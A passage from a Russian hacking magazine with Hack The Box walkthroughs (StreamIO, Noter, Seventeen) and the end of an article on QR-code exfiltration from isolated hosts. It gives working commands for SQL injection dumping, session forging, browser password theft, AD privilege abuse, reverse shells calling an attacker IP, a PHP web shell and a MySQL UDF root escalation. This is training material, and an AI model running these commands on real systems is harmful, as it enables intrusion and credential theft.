важно тон ко настроить процесс, чтобы принимающая сторона успевала рас-
познавать дан ные. А на принимающей стороне (то есть на атакующей машине)
тем временем все просто:


./qr_download.py

Скрипт вначале попросит ткнуть курсором в окно, из которого нужно распозна-
вать (например, RDP-клиент). Даль ше весь процесс полностью автоматизиро-
ван.
   Что немаловажно, на victim QR-коды будут генерировать ся прямо в кон -
соль, и поль зовать ся GUI нам не понадобит ся. Рекомен дует ся установить
классическую схему «черное на белом» для более качествен ного распозна-
вания. На изображении ниже показан пример получения произволь ного файла
с изолирован ного хоста.





QR-эксфиль трация показы вает скорость, сопоставимую с DNS. Скорость нас-
траивает ся самостоятель но, в моем примере она составляла 100 байт/с. Так
что, если ты располагаешь достаточным запасом времени, вполне реаль но
выг рузить доволь но боль шие объемы файлов.


ÍÀÆÀÒÈß ÊËÀÂÈØ + QR = TCP

Методы инфиль трации с keypress и эксфиль трации c QR-кодами предос-
тавляют возможность передавать дан ные каждый в своем направлении. И ско-
рости вполне может хватить, чтобы организовать TCP-тун нелирование, которое
позволит нам пробросить соединение на изолирован ный хост и начать ата-
ковать узлы внут ренних сетей.
  Безопасность удален ного рабочего места сейчас особен но акту аль на.
И даже если администраторы запретили буфер обмена на RDP и решения вро-
де  rdp2tcp не сработают либо ты пробился через  Telnet, неспособный
к передаче файлов, то всег да есть выход — это метод с передачей дан ных
через QR/keypress. Его невозможно запретить. Кроме того, описан ные здесь
методы не пот ребу ют под нимать привилегии на машине жертвы.
  Надеюсь, эта статья продемонстрировала системным администраторам
опасность резолвов произволь ных DNS-зон. К подобным настройкам нужно
проявлять повышен ное внимание.
ВЗЛОМ





       РАСКРУЧИВАЕМ ДОСТУП
     К MS SQL ДО ПОЛНОГО ЗАХВАТА
           МАШИНЫ




В этом рай тапе мы с тобой про эксплу ати -
руем SQL-инъекцию в фор ме авто риза ции
сай та и с помощью отла доч ной фун кции
заполу чим исходник сай та и пол ный дос-
туп к MS SQL. Учет ку адми нистра тора зах-             RalfHacker                                                                                          hackerralf8@gmail.com
ватим   через    эксплу ата цию   пра ва
WriteOwner. В общем, будет интересно!


Наш подопыт ный — сред няя по сложности машина StreamIO на основе
Windows с площад ки Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Начинаем, как обычно, со сканирования портов машины.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Видим много откры тых портов:
 • 53 — DNS;
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — Kerberos;
 • 135 — служба удален ного вызова процедур (Microsoft RPC). Исполь зует ся
   для операций взаимодействия кон троллер — кон троллер и кон троллер —
   клиент;
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 443 (HTTPS) — веб-сервер Microsoft IIS/10.0;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — исполь зует ся в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 1433 — Microsoft SQL Server 2019;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к кон троллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к кон троллеру
   через защищен ное соединение;
 • 3389 — RDP;
 • 5985 — WinRM;
 • 9389 — веб-службы AD DS.

Ни SMB, ни LDAP ничего пут ного не ответили, к MS SQL дефолтные учет ные
дан ные не подош ли, поэтому нам остался толь ко веб. Тем более SSL-сер-
тификат для порта 443 раскры вает нам еще два домен ных имени, которые мы
заносим в файл /etc/hosts.


10.10.11.158 streamio.htb DC.streamIO.htb watch.streamIO.htb





                    Главная страница сайта streamio.htb





                  Главная страница сайта watch.stream.htb

На первом сайте находим форму авторизации.





                        Панель логина


ÒÎ×ÊÀ ÂÕÎÄÀ
SQL Injection
Так как мы точно знаем, что на хосте работает СУБД, стоит проверить некото-
рые методы для обхода авторизации. Перебирать будем по списку с помощью
Burp Intruder.





                 Burp Intruder — вклад ка Payload Positions

Это ничего не дало, поэтому попробу ем наг рузки для поиска SQL-инъекции.
И срабаты вает наг рузка ;WAITFOR DELAY '0:0:30 для MS SQL с времен ной
задержкой, которую можно определить по столбцу Response time.





                        Резуль тат перебора

Мы под твердили наличие уязвимости, а значит, можем исполь зовать sqlmap
для удобной эксплу атации. Сперва запустим ПО для под бора наг рузки и соз-
дания шаблона.


sqlmap -u https://streamio.htb/login.php --data='username=admin&
password=admin' -p username --batch





                   Ин формация об уязвимости

Теперь мы можем приступить к получению дан ных. Первым делом нужно
узнать названия существу ющих БД (параметр --dbs).


sqlmap -u https://streamio.htb/login.php --data='username=admin&
password=admin' -p username --batch --dbs





                          Базы дан ных

Тут нас интересу ют две базы: streamio_backup и STREAMIO. Первую мы прос-
мотреть не можем, поэтому получим таблицы второй (параметр --tables).


sqlmap -u https://streamio.htb/login.php --data='username=admin&
password=admin' -p username --batch -D STREAMIO --tables





                     Таблицы из базы STREAMIO

Сразу  становит ся  ясно,  что следующая цель —  таблица users. Чтобы
не пытать ся вытащить все дан ные, попробу ем получить названия колонок
(параметр --columns).


sqlmap -u https://streamio.htb/login.php --data='username=admin&
password=admin' -p username --batch -D STREAMIO -T users --columns





                      Колон ки в таблице users


sqlmap -u https://streamio.htb/login.php --data='username=admin&
password=admin' -p username --batch -D STREAMIO -T users -C
username,password --dump

Теперь получим дан ные (параметр --dump) толь ко из колонок username
и password.





                      Дан ные из базы users

У нас очень много хешей, пред положитель но MD5. Чтобы найти прообраз, я
поль зуюсь онлайновым ресурсом crackstation.net.





                         Взломан ные хеши

В итоге мы получаем следующие пары логинов и паролей, с которы ми можно
попытать ся авторизовать ся на сайте.





                  Получен ные учет ные дан ные

Но, к сожалению, доступ мы так и не получаем. Может, на сайте есть админка?
Чтобы найти ее, будем бру тить каталоги.


ffuf -u 'https://streamio.htb/FUZZ' -t 256 -w directory_2.3_
medium_lowercase.txt





                   Резуль тат перебора каталогов

Есть каталог admin, где мы авторизу емся от имени поль зователя yoshihide.





                     Панель администратора




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                         РАСКРУЧИВАЕМ ДОСТУП
             К MS SQL ДО ПОЛНОГО ЗАХВАТА МАШИНЫ





ÒÎ×ÊÀ ÎÏÎÐÛ
У нас есть несколь ко доступных страниц. Но важны не сами страницы, а то,
как сервер узнает, какую заг рузить, — по имени парамет ра.





                           Страница User

С помощью Burp Intruder мы можем пробрутить название парамет ра, чтобы
попробовать найти новые страницы.





                 Burp Intruder — вклад ка Payload Positions





                      Резуль тат сканирования

В итоге определяем четыре страницы. Три из них нам уже известны, а вот
debug — что-то новень кое.





                  Содержимое страницы debug

Эта страница должна позволять читать файлы. Нас интересу ет код на PHP,
а чтобы его получить, нужно исполь зовать обертки на PHP. Давай закодируем
страницу index.php в Base64.


?debug=php://filter/convert.base64-encode/resource=index.php





                  Получение страницы index.php

Для  декодирования  выделяем  интересу ющий  нас  текст  прямо  в  Burp
и нажимаем Ctrl-Shift-B.





                    Исходный код страницы

Код страницы раскрыл нам учет ные дан ные для под ключения к СУБД. Вот
толь ко CrackMapExec не разрешил нам под ключить ся, а DBeaver сработал
без  проблем.  При  этом  мы  можем  просмотреть   базу  дан ных
streamio_backup.


cme mssql 10.10.11.158 -u db_admin -p 'B1@hx31234567890'



              Ошибка под ключения к СУБД MS SQL





        Содержимое таблицы users базы дан ных streamio_backup

От правляем очеред ную порцию хешей и получаем новый пароль.





                        Кряк получен ных хешей

Проверяем новую пару учет ных дан ных при под ключении к ресурсу SMB.


cme smb 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'



          Проверка учет ных дан ных с помощью CrackMapExec

Учет ные дан ные валид ны. Точно так же получается под ключить ся к службе
WinRM и забрать флаг поль зователя.


evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158





                        Флаг поль зователя


ÏÐÎÄÂÈÆÅÍÈÅ
При прод вижении очень важно проверить все места, где могут быть учет ные
дан ные поль зователей. Первым делом смот рим, какие прог раммы установ-
лены. И находим продук ты Mozilla.


Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\
CurrentVersion\Uninstall





             Ин формация о Mozilla Maintenance Service

Дан ные приложений обычно хранят ся в каталогах по путям вроде такого:


C:\Users\nikk37\Desktop\AppData\Roaming\





                  Содержимое каталога Firefox

И мы наш ли установленный Firefox, а браузеры — это кладезь полезной
информации для пен тестера. Чтобы достать дан ные, нам нужно определить ся
с профилем поль зователя (в нашем слу чае дефолтный), а затем скачать
из него два файла — logins.json и key4.db.





                     Профили поль зователя

Расшифровать дан ные из этих файлов очень просто. Нам понадобит ся скрипт
firepwd. Запустим его из каталога со скачан ными файлами и получим рас-
шифрован ные учет ки!





                    Сохранен ные в Firefox пароли

Паролей накопилось очень много, поэтому получим реаль ных системных поль -
зователей и пробрутим с помощью CrackMapExec.


net users /domain





                   Домен ные поль зователи


cme smb 10.10.11.158 -u users.txt -p passwords.txt



                    Валид ные учет ные дан ные

И получаем нового поль зователя — JDgodd!


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
BloodHound
Боль ше ничего интересного на самом хосте не находим, поэтому поищем
мисконфиги (уязвимые кон фигурации). В этом может помочь BloodHound.
Эта прог рамма сканиру ет LDAP и исполь зует графы для выявления скры тых
и часто непреднамерен ных взаимосвязей в среде Active Directory и Azure.
Это помогает лег ко иден тифицировать очень сложные пути атаки, которые
в противном слу чае было бы невозможно найти быстро. Для работы с дан ными
нам дополнитель но нужно установить СУБД Neo4j. Или можно просто запус-
тить ее в Docker.


docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/s3cr3t
neo4j

Чтобы не закиды вать исполняемый файл BloodHound на хост, а потом не ска-
чивать резуль таты сканирования обратно, можно восполь зовать ся версией
прог раммы на Python .


bloodhound-python -d streamio.htb -u nikk37 -p
'get_dem_girls2@yahoo.com' -gc dc.streamio.htb -c all -ns 10.10.
11.158





                Сбор дан ных с помощью BloodHound

Затем заг ружаем файлы с резуль татом в главное приложение BloodHound,
помечаем поль зователей, которые уже под нашем кон тролем (Mark as Owned),
и выбираем опцию построения путей от таких поль зователей (Shortest Path
from Owned Principals).





          Граф повышения привилегий от поль зователя JDgodd

Таким образом, поль зователь JDgodd имеет право WriteOwner для группы
Core Staff, а поль зователи этой группы могут читать пароли LAPS! Привиле-
гия WriteOwner дает нам возможность сменить владель ца объекта на поль -
зователя, которого мы кон тролиру ем, и тем самым захватить объект. Давай
сделаем это с помощью PowerShell.


$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r'
-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(
'streamio\JDgodd', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff"
 -principalidentity "streamio\JDgodd"

Теперь, ког да мы стали владель цем группы Core Staff, добавим себя в эту
группу.


Add-DomainGroupMember -identity "Core Staff" -members "streamio\
JDgodd" -credential $Cred

Готово: наш поль зователь может читать пароли LAPS!


LAPS
LAPS позволяет управлять паролями локаль ных учет ных записей компь ютеров,
присоединен ных к домену. Пароли хранят ся в Active Directory и защищены ACL,
поэтому прочитать их могут толь ко определен ные поль зователи. LAPS устанав-
ливает разные слу чайные пароли для учет ных записей локаль ных администра-
торов на каждом компь ютере в домене. Таким образом, мы можем запросить
пароль   локаль ного  администратора   системы   с  помощью   скрипта
LAPSDumper.


python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.
htb -l 10.10.11.158





                    Получение пароля LAPS

Теперь под ключим ся с дан ным паролем как администратор машины.


evil-winrm -u Administrator -p '@v+422k]E;.9B0' -i 10.10.11.158




                            Флаг рута

И машина захвачена!
ВЗЛОМ





            ЛОМАЕМ
      ВЕБ-ПРИЛОЖЕНИЕ НА FLASK





В этом рай тапе мы обой дем авто риза цию
в при ложении  на  Flask, затем  изу чим
исходные коды при ложения, что бы най ти
и    про эксплу ати ровать    уяз вимость.
Для повышения при вилегий используем             RalfHacker                                                                                          hackerralf8@gmail.com
уяз вимость уста нов ки пла гина в MySQL.


Наша цель — прохождение сред ней по сложности машины Noter с площад ки
Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.160    noter.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Наш лось три откры тых порта:
 • 21 — служба vsftpd 3.0.3;
 • 22 — служба OpenSSH 8.2p1;
 • 5000 — веб-сервер Python Werkzeug 2.0.2.

Аноним ный вход на FTP зак рыт, с SSH мы ничего не сделаем, поэтому идем
смот реть веб.





               Главная страница сайта http://noter.htb:5000/


ÒÎ×ÊÀ ÂÕÎÄÀ
На сайте есть возможность регистрировать ся и авторизовать ся, чем мы обя-
затель но должны восполь зовать ся.





            Главная страница зарегистрирован ного поль зователя

Я всю работу выполняю через Burp, поэтому в иден тификаторе сессии поль -
зователя сразу заметил токен JWT.





                    Запрос на сервер в Burp Pro


JWT
JSON Web Token хранит необходимую информацию о текущем сеан се. В числе
прочего в нем содержится HMAC — hash-based message authentication code,
код авторизации на основе хеша. Его-то нам и пред стоит под делать.
   Для работы с JWT будем исполь зовать утилиту Flask-Unsign .


sudo pip3 install Flask==2.1.0 flask_unsign
flask-unsign --decode --cookie
'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFsZiJ9.YvKLvw.
fDwY2juxacH9LTQV7xx_RyGo8EM'



                 Получение информации о сеан се

Для создания HMAC требует ся сек ретный ключ. Если мы сумеем восстановить
или  взломать  сек ретный  ключ,  то сможем  вносить любые изменения
в информацию о сеан се. С помощью Flask-Unsign можем попробовать проб-
рутить сек рет.


flask-unsign --wordlist rockyou.txt --unsign --cookie
'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFsZiJ9.YvKLvw.
fDwY2juxacH9LTQV7xx_RyGo8EM' --no-literal-eval



                  Получение сек ретного ключа

Мы получили сек ретный ключ, а значит, можем записать свои дан ные в сеанс,
в дан ном слу чае сменить поль зователя. Генерируем сессию, устанавливаем
в браузере и обновляем  страницу. Я попробовал поль зователя admin,
но ничего не выш ло.


flask-unsign --sign --cookie "{'logged_in': True, 'username':
'admin'}" --secret 'secret123' --legacy



                     Генерирование нового токена





                   Ошибка авторизации

Скорее всего, такого поль зователя не существу ет, поэтому нужно найти спо-
соб определить реаль ных поль зователей. Сайт работает на Flask, к тому же
пред назначен для хранения заметок, поэтому первым делом я стал искать SSTI
(включение шаблонов на стороне сервера) и XSS. Начал с создания замет ки.





                   Создание замет ки с наг рузкой

Затем я определил все места, где происходит вывод этого тек ста, но, к моему
сожалению, везде исполь зует ся экранирование.





                         Главная страница сайта





                     Замет ки поль зователя





                Содержимое созданной замет ки

Тест наг рузкой для XSS так же не увен чался успехом. Тог да я решил пос-
мотреть на механизм авторизации, а имен но на сообщения, которые сервер
отдаст в разных ситу ациях. Иног да в таких слу чаях помогает определять время,
которое зат рачивается на проверку правиль ных и неправиль ных учет ных дан -
ных. Но так далеко идти оказалось не нужно: сообщения для существу ющего
и несуществу ющего поль зователя оказались разными.





            От вет сервера для несуществу ющего аккаунта





             От вет сервера для существу ющего аккаунта




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                               ЛОМАЕМ
                    ВЕБ-ПРИЛОЖЕНИЕ НА FLASK





ÒÎ×ÊÀ ÎÏÎÐÛ
Воору жаем ся Burp Intrueder и принимаемся за перебор.
  Перекидываем запрос в Burp (Ctrl-I, Ctrl-Shift-I) и отмечаем для перебора
логин.





                    Burp Intruder — вклад ка Position

Список имен поль зователей берем из набора SecLists.





                    Burp Intruder — вклад ка Payloads

Устанавливаем 256 потоков (можно и боль ше).





                  Burp Intruder — вклад ка Resource Pool

В резуль тиру ющую таблицу добавим еще один столбец, куда будет попадать
сообщение об ошибке.
   Для этого на вклад ке Options перейдем к парамет ру Grep → Extract, найдем
в ответе сервера сообщение об ошибке и установим флажок Extract from regex
group.





                    Burp Intruder — вклад ка Options

Запускаем перебор и вскоре находим поль зователя blue.





                     Burp Intruder — вклад ка Results

Теперь мы можем сгенерировать токен для найден ного поль зователя.


flask-unsign --sign --cookie "{'logged_in': True, 'username':
'blue'}" --secret 'secret123' --legacy



                        Генерирование токена

Применяем токен, обновляем страницу и получаем сессию целевого поль -
зователя на сайте.





                   Главная страница поль зователя Blue

Сразу просмотрим записи поль зователя.





                     Замет ки поль зователя

В одной замет ке мы находим учет ные дан ные поль зователя blue для службы
FTP и имя еще одного поль зователя — ftp_admin. Вторая замет ка особого
интереса не пред ставляет.





                          Замет ка 1





                          Замет ка 2

Под ключаем ся к службе FTP с найден ным паролем и просматриваем файлы.





                       Под ключение к FTP

Там всего один документ PDF, забираем его.





                       Заг рузка файла policy.pdf

В PDF описана пароль ная политика. Нас интересу ет пункт 4 в графе Password
Creation.





                  Содержимое файла policy.pdf

Таким образом, пароль формиру ется по маске:


[username]@[sitename]!

По аналогии с паролем blue@Noter! для поль зователя blue мы можем сос-
тавить пароль для поль зователя ftp_admin — ftp_admin@Noter!.





                       Под ключение к FTP

Под ключившись c составлен ными учет ными дан ными, получаем еще два фай-
ла бэкапов.


ÏÐÎÄÂÈÆÅÍÈÅ
Просматриваем исходные коды из бэкапов. В одном находим учет ные дан ные
для под ключения к базе дан ных, а из второго раскры ваем новые точки входа.





              Учет ные дан ные для под ключения к базе дан ных

Так, через страницу /export_note_remote можно выполнить коман ду в коман -
дной оболочке /bin/bash. Коман да формиру ется с исполь зованием нашего
поль зователь ского ввода, а имен но содержимого замет ки.





            Исходный код обработ чика export_note_remote

Эта страница принимает URL-адрес, на котором должна хостить ся замет ка.
Поместим файл с реверс-шеллом на своем сервере. При этом мы должны
пройти шаблон, зак рыть выполняемую коман ду node и толь ко потом выполнить
бэк коннект.


--'; bash -i >& /dev/tcp/10.10.14.81/4321 0>&1; echo'--





                        Эк спорт замет ки

И на откры тый листенер (запущен ный коман дой rlwrap nc -lvnp 4321) мы
получим бэк коннект.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Мы имеем учет ные дан ные к MySQL, причем для привилегирован ного поль -
зователя root. Но чтобы удобно работать с MySQL, нам нужно создать нор-
маль ную TTY-оболочку. Самый простой способ сделать это — исполь зовать
модуль pty для Python.


python3 -c "import pty; pty.spawn('/bin/bash')"

А теперь можем под ключить ся к базе.


mysql -h localhost -u root -pNildogg36





                   Под ключение к СУБД MySQL

Так как мы работаем от имени рута, в прод вижении нам поможет создание
поль зователь ской фун кции MySQL. Если ском пилировать такую фун кцию
в виде библиотеки, то ее можно будет вызывать как встроенную. Мы создадим
фун кцию, которая будет вызывать коман ды операционной системы. Они
выполнятся с теми же привилегиями, что и работающая служба, то есть в дан -
ном слу чае от имени root.
  Первое,  что  стоит  проверить, —  это  включена  ли  перемен ная
secure_file_priv. Она позволит нам разрешить операции импорта и экспор-
та дан ных — такие как фун кции load_file и load_data.


show variables like '%secure_file_priv%';





               Получение перемен ной secure_le_priv

Значение равно null, то есть перемен ная отключена, и мы можем заг рузить
дан ные в базу. Теперь нужно получить системный каталог с плагинами MySQL.
Имен но в него нам и нужно будет добавить библиотеку.


show variables like '%plugin%';





                 Получение каталога с плагинами

В качестве библиотеки исполь зуем готовый код , который нужно будет ском -
пилировать.


wget https://www.exploit-db.com/raw/1518 -O 1518.c
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o

Затем заг ружаем этот эксплоит на удален ный хост и с помощью MySQL
копиру ем его в каталог с плагинами.


use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/
mariadb19/plugin/raptor_udf2.so';

Теперь создадим поль зователь скую фун кцию do_system. И сразу проверим,
доступна ли она в MySQL.


create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;





            Проверка созданной поль зователь ской фун кции

Теперь мы можем выполнять коман ды в привилегирован ном кон тек сте.
В качестве метода персистен тности установим бит SUID файлу коман дной
оболочки /bin/bash.


select do_system('chmod u+s /bin/bash');




Ког да у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до поль зователя — вла-
дель ца файла в рам ках запущен ного процесса. После получения повышен ных
прав приложение может выполнять задачи, которые недоступны обычному
поль зователю. Из-за возможности состояния гон ки многие операционные сис-
темы игнориру ют S-атрибут, установленный shell-скриптам.





                    Вы полнение коман ды

Коман да успешно выполнена, а значит, мы можем запустить Bash в привиле-
гирован ном кон тек сте и забрать флаг рута.





                            Флаг рута

Машина захвачена!
ВЗЛОМ





      ПОДМЕНЯЕМ ПАКЕТ NPM
        ДЛЯ ЗАХВАТА ХОСТА





В этом рай тапе я покажу, как соз дать свой
реестр NPM и раз местить с ним вредонос-
ный пакет для захвата уда лен ной машины.
Но нач нем мы с SQL-инъекции, а затем
заюзаем известную RCE для повышения             RalfHacker                                                                                          hackerralf8@gmail.com
при вилегий.


Наша цель — захват машины Seventeen с тренировочной площад ки Hack
The Box. Задание оценено как сложное.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.165    seventeen.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Видим три откры тых порта:
 • 22 — служба OpenSSH 7.6p1;
 • 80 — веб-сервер Apache 2.4.29;
 • 8000 — веб-сервер Apache 2.4.38.

Нам доступно сразу два веб-сервера, с которых и начнем пробивать периметр.





                         Главная страница сайта

Осмотревшись на сайте, находим под тверждение тому, что в самом начале
выбрали верное домен ное имя.





                            Лен динг

Боль ше ничего интересного нет, поэтому перейдем к активному сканиро-
ванию.


ÒÎ×ÊÀ ÂÕÎÄÀ
Итак, я попробую поискать скры тые файлы и каталоги. Делать это я буду
при помощи сканера ffuf.




Од но из первых действий при тестировании безопасности веб-приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скры тую
информацию и недоступные обычным посетителям фун кции. Для этого можно
исполь зовать прог раммы вроде dirsearch и DIRB.
  Я пред почитаю лег кий и очень быстрый ﬀuf . При запуске указываем сле-
дующие парамет ры:
 • -w — словарь (я исполь зую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из резуль тата ответы с кодом 403.





ffuf -u 'http://seventeen.htb/FUZZ' -t 256 -w directory_2.3_
medium_lowercase.txt





            Резуль тат сканирования каталогов с помощью ﬀuf

Сканирование каталогов ничего интересного не дало. Дру гих HTML-страниц
тоже не наш лось. Остается просканировать под домены. В этом слу чае мы
будем перебирать заголовок Host в парамет ре -H. Так как все ответы будут
вести на основной домен, можем их отфиль тровать по размеру страницы
в парамет ре --fs.


ffuf -u 'http://seventeen.htb/' -t 256 -w subdomains-top1million-
110000.txt -H 'Host: FUZZ.seventeen.htb' --fs 20689



                 Резуль тат сканирования под доменов

Находим один под домен, запись для которого добавляем в /etc/hosts.


10.10.11.165 seventeen.htb exam.seventeen.htb





                Главная страница сайта exam.seventeen.htb


Exam Reviewer Management System
На сайте нас встречает Exam Reviewer Management System, для которой мы
лег ко находим публичный эксплоит в базе Exploit-DB. Это SQL-инъекция.





                 Описание способа эксплу атации

Нам предоставляют готовую наг рузку, которой непремен но стоит восполь -
зовать ся. Первым делом запустим sqlmap.


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id
--level 3





                  Рабочая наг рузка для эксплу атации

Sqlmap нашел наг рузку, теперь получим базы дан ных (параметр --dbs).


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id
--dbs --level 3





                          Базы дан ных

От мечаем для себя, что на сервере исполь зуют ся и дру гие плат формы, вклю-
чая Roundcube. Начнем с первой базы, получим таблицы (параметр --tables)
из базы db_sfms (параметр -D).


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D db_
sfms --tables





                       Таблицы в базе db_sfms

Давай сдам пим (параметр --dump) таблицы user и student (параметр -T).
Для быстроты исполь зуем десять потоков (параметр --threads).


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --threads
10 -D db_sfms -T user --dump





                   Содержимое таблицы user


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --threads
10 -D db_sfms -T student --dump





                  Содержимое таблицы student

Получили много хешей, что не может не радовать. Теперь перейдем к базе
erms_db и по привычному сценарию сначала узнаем таблицы.


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --threads
10 -D erms_db --tables





                       Таблицы в базе erms_db

Из этой базы тоже сдам пим поль зователей.


sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --threads
10 -D erms_db -T users --dump





                   Содержимое таблицы user

Кроме хешей, мы раскры ваем каталог с аватарами, а это неизвестная до дан -
ного момен та дирек тория на веб-сервере — /oldmanagement! Из Roundcube
ничего не получаем, поэтому с помощью онлайновой базы крякаем хеши.





                          Взлом хешей

Получаем один пароль, с которым попробу ем пойти на найден ный сайт —
School File Management System.





                Сайт seventeen.htb:8000/oldmanagement




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                    ПОДМЕНЯЕМ ПАКЕТ NPM
                        ДЛЯ ЗАХВАТА ХОСТА





ÒÎ×ÊÀ ÎÏÎÐÛ
После авторизации видим заг ружен ный файл, который мы, конечно же, ска-
чаем.





                    Профиль поль зователя Kelly

Нем ного почитав про эту систему, я узнал о возможности заг рузить и выпол-
нить файл на PHP. Файл будет расположен в каталоге /files/31234/. В качес-
тве реверс-шелла заг ружаем простой скрипт:


<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.16/4321 0>&1'"
); ?>





                   Список заг ружен ных файлов

Обращаемся к нашему скрипту по следующему адресу:


http://seventeen.htb:8000/oldmanagement/files/31234/reverse.php

И получаем ответ, что доступ зак рыт. Заг рузить скрипт в какой-нибудь дру гой
каталог, исполь зуя обход путей, тоже не выш ло.





             Ошибка при обращении к реверс-шеллу

Вернемся  к  скачан ному файлу, ведь там может быть  какая-то цен ная
информация. И находим в нем еще один сайт.





               Содержимое скачан ного докумен та

Добавляем домен в файл /etc/hosts. Так как порт 443 зак рыт, пойдем
на 8000. Доступ к корневому каталогу запрещен, зато страница mastermailer
существу ет, и там нас встречает Roundcube.





                      Панель авторизации

Никакие учет ные дан ные не под ходят, тог да просмотрим версию почтового
клиента. Ее возь мем из файла /CHANGELOG.





                  Резуль тат сканирования каталогов

Номер  версии  наш ли,  значит,  можно   искать  готовые   эксплоиты.
Для Roundcube Webmail 1.4.2 наш лась CVE-2020-12640. Это включение про-
изволь ных локаль ных файлов PHP. А в сочетании с тем, что мы можем заг -
рузить файл через дру гую CMS, это даст нам удален ное выполнение кода!


CVE-2020-12640
На GitHub удалось даже найти PoC. При этом нам доступен каталог installer.





                         Страница installer

Нам нужно перейти к опции Create cong и выполнить запрос на обновление
настроек, который мы перехватываем в Burp Proxy.





                   Запрос на обновление настроек

В PoC исполь зует ся несуществу ющий параметр _plugins_qwerty, который
указывает произволь ный каталог. Я обратил внимание на то, что рядом с этим
